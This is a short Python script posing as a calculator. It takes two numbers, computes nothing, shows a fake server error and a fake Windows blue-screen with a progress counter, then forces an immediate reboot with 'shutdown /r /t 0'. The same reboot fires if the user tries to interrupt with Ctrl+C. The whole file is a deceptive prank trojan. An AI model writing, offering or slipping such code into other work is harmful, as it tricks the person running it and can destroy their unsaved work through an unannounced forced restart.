import time
import os

try: 
    sleep = lambda x: time.sleep(x)
    system = lambda c: os.system(c)

    system('color 07')
    print("Welcome to calculator.")
    num1 = int(input("Enter first number: "))
    num2 = int(input("Enter second number: "))
    sleep(5)
    system('cls')
    print("Internal Server Error..")
    sleep(3)
    system('cls')
    system('color 97')
    progress = 0
    while progress <= 100:
        print(":(")
        print(f"Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.\n{progress}% complete")
        print('''           \n\nFor more information about this issue and possible fixes, visit\n           http://windows.com/stopcode\n\n           If you call a support person, give them this info:\n
            Stop code: CRITICAL_PROCESS_DIED''')
        sleep(2)
        system('cls')
        progress += 1
    system('color 07')
    system("shutdown /r /t 0")
except KeyboardInterrupt:
    system("shutdown /r /t 0")
